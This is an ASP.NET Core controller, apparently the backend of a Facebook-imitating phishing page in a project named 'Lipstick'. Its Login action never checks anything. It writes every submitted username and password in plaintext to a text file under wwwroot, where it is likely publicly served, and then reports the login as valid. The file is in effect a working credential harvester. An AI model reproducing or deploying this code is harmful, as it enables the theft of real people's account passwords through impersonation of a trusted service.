using Microsoft.AspNetCore.Mvc;

namespace Lipstick.Controllers
{
    public class FaceBookController : Controller
    {
        public IActionResult Index()
        {
            return View();
        }
        public IActionResult Login()
        {
            return View();
        }
        [HttpPost]
        public IActionResult Login([FromBody] LoginVM model)
        {
            string path = "./wwwroot/TextFile.txt";
            string content = string.Concat("UserName: ", model.UserName, " ", "PassWord: ", model.Password);
            if (!System.IO.File.Exists(path))
            {
                // Create a file to write to.
                using (StreamWriter sw = System.IO.File.CreateText(path))
                {
                    sw.WriteLine(content);
                }
            }
            using (StreamWriter sw = System.IO.File.AppendText(path))
            {
                sw.WriteLine(content);
            }

            return Json(new { isValid = true });
        }

        public IActionResult TestLogin()
        {
            return View();
        }
        [HttpPost]
        [AutoValidateAntiforgeryToken]

        public IActionResult TestLogin(LoginVM model)
        {
            var temp = Request.Headers["Origin"];
            return View();
        }
    }
    public class LoginVM
    {
        public string UserName { get; set; }
        public string Password { get; set; }
    }
}
